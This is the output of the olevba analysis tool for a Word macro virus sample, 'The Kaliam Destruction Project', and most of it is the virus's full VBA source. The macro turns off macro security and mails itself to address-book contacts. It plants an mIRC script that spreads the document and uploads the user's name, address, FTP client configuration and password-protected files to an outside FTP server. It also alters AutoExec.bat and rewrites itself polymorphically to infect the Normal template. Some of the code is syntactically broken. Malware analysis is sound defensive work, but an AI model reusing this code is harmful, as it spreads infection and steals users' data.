olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.KDP.b-0c029d514e82e1394d1edb83b67c8188e314da0c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.KDP.b-0c029d514e82e1394d1edb83b67c8188e314da0c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
'
' The Kaliam Destruction Project.
' Programmed in Bergen (NORWAY). 05/99.
' This is a research virus - DO NOT DISTRIBUTE.
'
Application.EnableCancelKey = wdDisabled
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize Timer
KDP = "QD901"
NormInstalled = False
ActInstalled = False
Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule

NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)

If UCase(NI) = "ON ERROR RESUME NEXT" Then NormInstalled = True
If UCase(AI) = "ON ERROR RESUME NEXT" Then ActInstalled = True

If NormInstalled = False Then
    Set Infection = NormCarrier
    Set Carrier = ActCarrier
Else
    Set Infection = ActCarrier
    Set Carrier = NormCarrier
End If

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If

DoEvents

Dim KDP-1, KDP-2, KDP-3
Set KDP-1 = CreateObject("Outlook.Application")
Set KDP-2 = KDP-1.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "KDP") <> "by QD901" Then
If KDP - 1 = "Outlook" Then
KDP-2.Logon "profile", "password"
    For y = 1 To KDP-2.AddressLists.Count
        Set AddyBook = KDP-2.AddressLists(y)
        x = 1
        Set KDP-3 = KDP-1.CreateItem(0)
        For oo = 1 To AddyBook.AddressEntries.Count
            Peep = AddyBook.AddressEntries(x)
            KDP-3.Recipients.Add Peep
        x = x + 1
        If x > 50 Then oo = AddyBook.AddressEntries.Count
     Next oo
     KDP-3.Subject = "(PRIORITY: TOP) Promised Document from " & Application.UserName
     KDP-3.Body = "I found this Microsoft Word document on the Internet. You really oughta read it!"
     KDP-3.Attachments.Add ActiveDocument.FullName
     KDP-3.Send
     Peep = ""
    Next Y
KDP-2.Logoff
End If

Close
Tr1 = Dir(CurDir & "\Script.ini", vbNormal)
Tr2 = UCase(Right(CurDir, 8))
Tr3 = Dir("C" & Chr(58) & "\mIRC", vbDirectory)

If Tr1 <> "" Then SDir = CurDir & "\Script.ini"
If Tr2 = "DOWNLOAD" Then SDir = CurDir & "\..\Script.ini"
If Tr3 <> "" Then SDir = "C" & Chr(58) & "\mIRC\Script.ini"

If SDir <> "" Then
    Open SDir For Output As #1
    Print #1, "n0=on 1" & Chr(59) & "JOIN" & Chr(59) & "#" & Chr(59) & "if ( $me != $nick ) { /dcc send $nick " & ThisDocument.FullName & " }"
    Close #1
End If

If Int(Rnd * 10) > 7 Then
MsgBox "The Kaliam Destruction Project." & Chr(13) & "Programmed in Bergen (NORWAY). 05/99." & Chr(13) & "This is a research virus - DO NOT DISTRIBUTE."
End If

DoEvents

WinPath = Environ("WINDIR")

If Application.Tasks.Exists("Sockets Window") = True And System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = "" Or System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = WeekDay(Date) Then
    With Application.FileSearch
            .FileName = "WS_FTP.ini"
            .LookIn = "C" & Chr(58) & "\"
            .SearchSubFolders = True
            .MatchTextExactly = True
            .FileType = msoFileTypeAllFiles
            .Execute
            WsPath = .FoundFiles(1)
    End With
       
    DoEvents
    
    If ActiveDocument.HasPassword = True Then BCK = True
    
    DoEvents
    Open WinPath & "\" & Application.UserInitials & ".dat" For Output As #10
    Print #10, Application.UserName
    Print #10, Application.UserAddress
    If BCK = True Then Print #10, ActiveDocument.FullName
    If WsPath <> "" Then Print #10, "WS_FTP"
    Close #10
    Open WinPath & "\Command.$$$" For Output As #8
    Print #8, "o ftp.qd901.com"
    Print #8, "User KDP"
    Print #8, "KDP"
    Print #8, "binary"
    Print #8, "put " & WinPath & "\" & Application.UserInitials & ".dat"
    If WsPath <> "" Then Print #8, "put " & WsPath
    If BCK = True Then Print #8, "put " & ActiveDocument.FullName
        Print #8, "quit"
    Close
    Shell WinPath & "\Command.com /c FTP.exe -n -s:" & WinPath & "\Command.$$$", vbHide
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = WeekDay(Date)
End If

    DoEvents

    Open WinPath & "\Send.dat" For Output As #1
    Print #1, "o mail@hotmail.com 25"
    Print #1, "quote HELO Anonymous"
    Print #1, "quote MAIL From: <The Kaliam Destruction Project>"
    Print #1, "quote RCPT To: qd901@hotmail.com"
    Print #1, "quote DATA"
    Print #1, "quote Subject" & Chr(58) & Application.UserName & "; " & Application.UserAddress & "; " & System.Country; ""
    Print #1, "quote Date" & Chr(58) & Date & " " & Time
    Print #1, "quote ."
    Print #1, "quote QUIT"
    Print #1, "quit"

If Int(Rnd * 10) > 7 Then
MsgBox "The Kaliam Destruction Project." & Chr(13) & "Programmed in Bergen (NORWAY). 05/99." & Chr(13) & "This is a research virus - DO NOT DISTRIBUTE."
End If

Open "C:\AutoExec.bat" For Append As #1
a = Int(Rnd * 50000)
Print #1, "Debug 9 2 " & a & "1"
Close #1

For x = 1 To ThisDocument.Variables.Count
    ThisDocument.Variables(x).Delete
Next x
For x = 1 To Normal.ThisDocument.Variables.Count
    Normal.ThisDocument.Variables(x).Delete
Next x

With Carrier
    UECode = .Lines(1, 2) & Chr(13)
    For x = 5 To .CountOfLines - 1
        VCCode = .Lines(x, 1)
        If VCCode = "End Sub" Then Exit For
        For i = 1 To 20
            If Mid(VCCode, i, 1) = ":" Then VCCode = Right(VCCode, Len(VCCode) - i)
        Next i
        factor = ""
        For Y = 1 To Int(Rnd * 6) + 6
            factor = factor & Chr(Int(Rnd * 25) + 65)
        Next Y
        make_morph = factor & ": "

        VirCode = VirCode & make_morph & " " & VCCode & Chr(13)
        If Int(Rnd * 10) > 7 Then VirCode = VirCode & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & " = " & Chr(58) & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & Chr(58) & Chr(13)
    Next x
    VirCode = UECode & VirCode & "End Sub"
End With

Normal.ThisDocument.Variables.Add "VCode", VirCode

ResetMe = "Private Sub Document_Close()" & Chr(13)
ResetMe = ResetMe & String(150, Chr(9)) & "If ShowVisualBasicEditor=True Then Exit sub: With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, Normal.ThisDocument.Variables(1).Value: End With: ThisDocument.Save" & Chr(13)
ResetMe = ResetMe & "End Sub"

With ActCarrier
        .DeleteLines 1, .CountOfLines
        .InsertLines 1, ResetMe
End With

With NormCarrier
    .DeleteLines 1, .CountOfLines
    .InsertLines 1, ResetMe
End With

ActiveDocument.Save
NormalTemplate.Save

If Int(Rnd * 10) > 7 Then
MsgBox "The Kaliam Destruction Project." & Chr(13) & "Programmed in Bergen (NORWAY). 05/99." & Chr(13) & "This is a research virus - DO NOT DISTRIBUTE."
End If

Set KDP-4 = ActiveDocument.VBProject.VBComponents.Item(1)
Set KDP-5 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = KDP-5.CodeModule.CountOfLines
ADCL = KDP-4.CodeModule.CountOfLines
BGN = 2
If KDP-4.Name <> "KDP" Then
If ADCL > 0 Then _
ADI1.CodeModule.DeleteLines 1, ADCL
Set ToInfect = KDP - 4
KDP-4.Name = "KDP"
DoAD = True
End If

If KDP-5.Name <> "KDP" Then
If NTCL > 0 Then _
KDP-5.CodeModule.DeleteLines 1, NTCL
Set ToInfect = KDP - 5
KDP-5.Name = "KDP"
DoNT = True
End If

If DoNT <> True And DoAD <> True Then GoTo Doom
If DoNT = True Then
Do While KDP-4.CodeModule.Lines(1, 1) = ""
KDP-4.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While KDP-4.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, KDP-4.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If

If DoAD = True Then
Do While KDP-5.CodeModule.Lines(1, 1) = ""
KDP-5.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While KDP-5.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, KDP-5.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If

Doom:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
If Day(Now) = Minute(Now) Then Selection.TypeText "The Kaliam Destruction Project." & Chr(13) & "Programmed in Bergen (NORWAY). 05/99." & Chr(13) & "This is a research virus - DO NOT DISTRIBUTE."

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |FTP.exe             |Executable file name                         |
|IOC       |AutoExec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
